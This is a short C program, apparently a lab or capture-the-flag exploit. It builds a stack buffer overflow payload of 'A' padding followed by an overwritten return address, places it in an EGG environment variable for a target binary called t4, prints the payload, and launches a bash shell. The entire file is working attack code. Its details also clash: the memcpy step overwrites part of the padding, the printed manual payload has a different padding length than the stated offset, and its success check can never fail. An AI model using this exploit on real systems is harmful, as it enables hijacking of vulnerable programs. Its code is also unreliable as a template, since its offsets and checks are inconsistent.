#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
    

    char overflow_str[100];
    int offset = 32;
    
    for (int i = 0; i < offset; i++) {
        overflow_str[i] = 'A';
    }
    

    overflow_str[offset] = 0xa4;
    overflow_str[offset+1] = 0x85;
    overflow_str[offset+2] = 0x04;
    overflow_str[offset+3] = 0x8;
    overflow_str[offset+4] = '\0';
    

    if (memcpy(overflow_str, "EGG=", 4)) {
        printf("EGG environment variable set successfully\n");
        printf("Run the vulnerable program with: ./t4 \"$EGG\"\n");
    } else {
        printf("Failed to set EGG environment variable\n");
    }
    putenv(overflow_str);

    printf("\nExploit string (for manual use): \n");
    printf("AAAAAAAAAAAAAAAAAAAAAAAA");
    printf("\\xa4\\x85\\x04\\x08\n");
    system("/bin/bash");	
    return 0;
}